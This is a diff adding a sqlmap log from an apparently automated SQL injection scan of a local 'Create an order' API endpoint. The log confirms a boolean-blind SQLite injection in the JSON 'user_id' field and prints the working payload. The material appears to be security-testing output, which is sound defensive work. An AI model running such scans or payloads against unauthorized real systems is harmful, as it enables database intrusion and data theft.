@@ -1,0 +1,77 @@
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.9.9.4#dev}
+|_ -| . [.]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 15:17:10 /2025-09-26/
+
+[15:17:13] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Create_an_order_sqlmap' as the output directory
+JSON data found in POST body. Do you want to process it? [Y/n/q] Y
+[15:17:13] [INFO] testing connection to the target URL
+[15:17:14] [INFO] checking if the target is protected by some kind of WAF/IPS
+[15:17:14] [INFO] testing if the target URL content is stable
+[15:17:14] [INFO] target URL content is stable
+[15:17:14] [INFO] testing if (custom) POST parameter 'JSON user_id' is dynamic
+[15:17:14] [WARNING] (custom) POST parameter 'JSON user_id' does not appear to be dynamic
+[15:17:14] [WARNING] heuristic (basic) test shows that (custom) POST parameter 'JSON user_id' might not be injectable
+[15:17:14] [INFO] testing for SQL injection on (custom) POST parameter 'JSON user_id'
+[15:17:14] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[15:17:14] [WARNING] reflective value(s) found and filtering out
+[15:17:16] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[15:17:17] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
+[15:17:19] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
+[15:17:20] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
+[15:17:20] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
+[15:17:21] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
+[15:17:21] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
+[15:17:21] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[15:17:22] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[15:17:22] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
+[15:17:23] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
+[15:17:23] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
+[15:17:24] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
+[15:17:25] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
+[15:17:26] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
+[15:17:27] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
+[15:17:28] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
+[15:17:29] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[15:17:30] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[15:17:31] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
+[15:17:32] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
+[15:17:33] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
+[15:17:34] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
+[15:17:35] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
+[15:17:35] [INFO] (custom) POST parameter 'JSON user_id' appears to be 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)' injectable (with --code=200)
+it looks like the back-end DBMS is 'SQLite'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+[15:17:35] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[15:17:35] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[15:17:35] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
+[15:17:35] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
+[15:17:36] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
+[15:17:36] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
+[15:17:36] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
+[15:17:36] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
+[15:17:37] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
+[15:17:37] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
+[15:17:37] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
+[15:17:37] [INFO] checking if the injection point on (custom) POST parameter 'JSON user_id' is a false positive
+(custom) POST parameter 'JSON user_id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 1823 HTTP(s) requests:
+---
+Parameter: JSON user_id ((custom) POST)
+    Type: boolean-based blind
+    Title: SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)
+    Payload: {"user_id": "1 AND CASE WHEN 6288=6288 THEN 6288 ELSE JSON(CHAR(122,84,77,72)) END", "product_id": "1", "quantity": "1"}
+---
+[15:17:39] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+[15:17:39] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 1802 times
+[15:17:39] [INFO] fetched data logged to text files under 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Create_an_order_sqlmap\localhost'
+
+[*] ending @ 15:17:39 /2025-09-26/
+
